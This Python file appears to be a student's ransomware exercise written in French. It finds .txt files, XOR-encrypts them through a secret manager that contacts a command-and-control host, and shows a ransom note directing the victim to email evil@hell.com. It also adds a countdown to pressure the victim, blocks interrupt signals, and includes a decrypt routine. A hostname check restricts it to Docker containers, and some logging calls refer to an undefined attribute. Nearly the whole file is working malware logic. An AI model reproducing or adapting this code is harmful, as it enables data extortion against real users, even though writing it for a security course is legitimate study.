import logging
import socket
import re
import sys
import signal
import time
import threading  # Pour exécuter le compte à rebours en parallèle
from pathlib import Path
from secret_manager import SecretManager



CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list:
        # Définir le répertoire de départ comme étant le répertoire actuel
        current_directory = Path(".")
        # Parcourir tous les fichiers correspondant au filtre en excluant les liens symboliques
        files_found = [str(file.resolve()) for file in current_directory.rglob(filter) if not file.is_symlink()]
        return files_found
    
    # Compte à rebours pour faire pression sur la victime : Question du bONUS
    def countdown_timer(self, seconds):
        while seconds > 0:
            mins, secs = divmod(seconds, 60)
            timer = f'{mins:02}:{secs:02}'
            print(f"Temps restant avant destruction des données : {timer}", end="\r")
            time.sleep(1)
            seconds -= 1
        print("\nLe temps est écoulé. Les données seront définitivement inaccessibles.")
        self._log.info("Le compte à rebours est terminé.")

    def encrypt(self):
        # main function for encrypting (see PDF)
        try:
            
            # Démarre le compte à rebours dans un thread séparé
            countdown_thread = threading.Thread(target=self.countdown_timer, args=(300,))  # 300 secondes = 5 minutes
            countdown_thread.start()
            
            # Obtenir la liste des fichiers à chiffrer
            files_to_encrypt = self.get_files("*.txt")
            
            # Créer le gestionnaire de secrets avec les chemins donnés
            secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
            
            # Configurer le gestionnaire de secrets (génère les éléments cryptographiques)
            secret_manager.setup()
            
            # Chiffrer les fichiers trouvés
            secret_manager.xor_files(files_to_encrypt)
            
            # Obtenir le token en format hexadécimal et afficher le message pour la victime
            hex_token = secret_manager.get_hex_token()
            print(f"\nVos fichiers .txt ont été chiffrés. Contactez l'attaquant avec ce token pour déchiffrer : {hex_token}\n")
            
            # Message au logging pour rappeler la procédure de déchiffrement : Question du Bonus
            self._log.info("Vos fichiers ont été chiffrés. Pour les récupérer, lancez 'ransomware --decrypt' et suivez les instructions.")
            
            # Log success message
            self._log.info("Chiffrement terminé. Le message a été affiché pour la victime.")
        except Exception as e:
            self._log.error(f"Erreur lors du chiffrement : {e}")
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        # Initialisation du gestionnaire de secrets et chargement des éléments cryptographiques
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.load()  # Charger le sel et le token

        # Obtenir la liste des fichiers chiffrés à déchiffrer
        files_to_decrypt = self.get_files("*.txt")

        # Boucle de déchiffrement
        while True:
            try:
                # Demande de la clé de déchiffrement à l'utilisateur
                user_key = input("Entrez la clé de déchiffrement : ")

                # Vérification et définition de la clé de déchiffrement
                secret_manager.set_key(user_key)

                # Déchiffrement des fichiers
                secret_manager.xor_files(files_to_decrypt)

                # Nettoyage des éléments cryptographiques locaux
                secret_manager.clean()

                # Message de succès après déchiffrement réussi
                print("Les fichiers ont été déchiffrés avec succès.")

                # Sortie de la boucle
                break

            except ValueError:
                # Message d'erreur en cas de clé incorrecte
                print("La clé est incorrecte. Veuillez réessayer.")
            except Exception as e:
                # Message en cas d'erreur inattendue
                print(f"Erreur lors du déchiffrement : {e}")
                break
            
            
            
# Configurer le logger pour voir les messages : Question du Bonus
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

def signal_handler(sig, frame):
        print("\nImpossible d'interrompre le programme. Veuillez suivre les instructions pour déchiffrer.")
        log.warning("Tentative d'interruption interceptée.")

# Assigner la fonction signal_handler aux signaux SIGINT et SIGTERM
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()